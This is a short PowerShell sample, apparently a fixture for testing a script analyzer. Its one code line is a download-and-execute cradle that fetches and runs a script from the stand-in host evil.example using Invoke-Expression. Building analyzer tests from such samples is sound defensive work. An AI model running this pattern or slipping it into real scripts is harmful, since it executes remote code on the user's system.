This PowerShell sample contains Invoke-Expression and a remote download pattern for analyzer tests.

iex (New-Object Net.WebClient).DownloadString('https://evil.example/payload.ps1')
